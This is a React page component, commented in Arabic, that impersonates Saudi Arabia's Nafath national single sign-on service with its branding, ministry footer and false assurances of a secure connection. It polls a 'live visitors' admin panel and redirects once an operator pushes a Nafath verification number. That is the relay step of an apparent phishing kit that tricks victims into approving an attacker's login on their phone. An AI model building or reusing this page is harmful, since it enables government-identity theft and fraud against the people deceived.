import { SiteLayout } from "@/components/SiteLayout";
import { useLocation } from "wouter";
import { useEffect, useState } from "react";
import { trpc } from "@/lib/trpc";
import { getSessionId } from "@/lib/useStepSession";
import { ShieldCheck, Smartphone, ArrowDown } from "lucide-react";

/**
 * صفحة انتظار نفاذ:
 * - تعرض شعار نفاذ + رسالة انتظار + رسوم متحركة
 * - تقوم بـ polling لرقم nafathNumber من اللوحة
 * - عندما يُرسل الأدمن الرقم: تنتقل تلقائياً لصفحة /nafath-code لعرضه
 */
export default function NafathWait() {
  const [, setLocation] = useLocation();
  const [sessionId] = useState<string>(() => getSessionId());

  const { data: state } = trpc.liveVisitors.getControlState.useQuery(
    { sessionId },
    { refetchInterval: 2000, refetchIntervalInBackground: true }
  );

  useEffect(() => {
    if (state?.nafathNumber) {
      setLocation("/nafath-code");
    }
  }, [state, setLocation]);

  return (
    <SiteLayout bare>
      <div className="min-h-screen bg-white" dir="rtl">
        {/* الهيدر الأخضر بنمط نفاذ */}
        <header className="bg-white border-b-4 border-emerald-600 py-6 shadow-sm">
          <div className="container max-w-5xl mx-auto px-4 flex items-center justify-between">
            <div className="flex items-center gap-3">
              <ShieldCheck className="w-6 h-6 text-emerald-700" />
              <div>
                <p className="text-[11px] text-gray-500 font-bold">المنصة الوطنية للنفاذ الوطني الموحد</p>
                <p className="text-[10px] text-gray-400">National Single Sign-On</p>
              </div>
            </div>
            <NafathLogo />
          </div>
        </header>

        {/* المحتوى */}
        <main className="container max-w-3xl mx-auto px-4 py-12">
          {/* بطاقة بيضاء كبيرة */}
          <div className="bg-white border border-gray-200 rounded-3xl shadow-xl overflow-hidden">
            {/* شريط علوي أخضر */}
            <div className="h-2 bg-gradient-to-r from-emerald-500 via-emerald-600 to-emerald-700" />

            <div className="p-8 md:p-12 text-center">
              {/* رسم متحرك لتطبيق نفاذ */}
              <div className="relative w-32 h-32 mx-auto mb-8">
                {/* حلقات دوّارة */}
                <div className="absolute inset-0 rounded-full border-4 border-emerald-100" />
                <div
                  className="absolute inset-0 rounded-full border-4 border-transparent border-t-emerald-500 animate-spin"
                  style={{ animationDuration: "1.5s" }}
                />
                {/* أيقونة الهاتف */}
                <div className="relative w-32 h-32 flex items-center justify-center">
                  <div className="w-20 h-20 rounded-2xl bg-gradient-to-br from-emerald-500 to-emerald-700 flex items-center justify-center shadow-xl">
                    <Smartphone className="w-10 h-10 text-white" />
                  </div>
                </div>
                {/* نقطة تنبيه */}
                <div className="absolute top-1 right-1 w-5 h-5 rounded-full bg-red-500 border-2 border-white animate-pulse">
                  <div className="w-full h-full rounded-full bg-red-500 animate-ping opacity-75" />
                </div>
              </div>

              <h1 className="text-2xl md:text-3xl font-extrabold text-emerald-700 mb-3 leading-relaxed">
                الرجاء الانتظار...
              </h1>
              <p className="text-base text-gray-700 mb-2 leading-relaxed">
                سيتم إرسال طلب التحقق من المعلومات إلى تطبيق <span className="font-bold text-emerald-700">نفاذ</span> على جوالك
              </p>
              <p className="text-sm text-gray-500 mb-8">
                لا تخرج من هذه الصفحة حتى يتم التأكد من صحة بياناتك
              </p>

              {/* نقاط متحركة */}
              <div className="flex items-center justify-center gap-2 mb-8">
                {[0, 1, 2, 3, 4].map((i) => (
                  <div
                    key={i}
                    className="w-3 h-3 rounded-full bg-emerald-500 animate-bounce"
                    style={{ animationDelay: `${i * 0.15}s`, animationDuration: "1s" }}
                  />
                ))}
              </div>

              {/* تنبيه نفاذ */}
              <div className="bg-emerald-50 border-2 border-emerald-200 rounded-2xl p-5 max-w-md mx-auto">
                <div className="flex items-start gap-3 text-right">
                  <div className="w-10 h-10 rounded-full bg-emerald-600 flex items-center justify-center shrink-0">
                    <ArrowDown className="w-5 h-5 text-white animate-bounce" />
                  </div>
                  <div className="flex-1">
                    <p className="font-bold text-emerald-800 text-sm mb-1">افتح تطبيق نفاذ على جوالك</p>
                    <p className="text-xs text-emerald-700 leading-relaxed">
                      ستظهر لك شاشة التحقق خلال لحظات. تأكد أن التطبيق محدّث ومتصل بالإنترنت.
                    </p>
                  </div>
                </div>
              </div>
            </div>

            {/* الذيل */}
            <div className="bg-gray-50 border-t border-gray-100 px-8 py-4 flex items-center justify-between text-xs text-gray-500">
              <div className="flex items-center gap-2">
                <ShieldCheck className="w-3.5 h-3.5 text-emerald-600" />
                اتصال مشفّر وآمن
              </div>
              <div className="font-mono text-[10px]">
                Powered by <span className="text-emerald-700 font-bold">Nafath</span>
              </div>
            </div>
          </div>

          {/* تذييل تعريف */}
          <p className="text-center text-[11px] text-gray-400 mt-8 leading-relaxed">
            النفاذ الوطني الموحد - وزارة الاتصالات وتقنية المعلومات - المملكة العربية السعودية
          </p>
        </main>
      </div>
    </SiteLayout>
  );
}

function NafathLogo() {
  return (
    <div className="flex items-center gap-2">
      <span className="text-2xl md:text-3xl font-extrabold text-emerald-700" style={{ fontFamily: "'Tajawal', sans-serif" }}>
        نفاذ
      </span>
      <span className="text-[10px] text-gray-400 font-bold">Nafath</span>
    </div>
  );
}
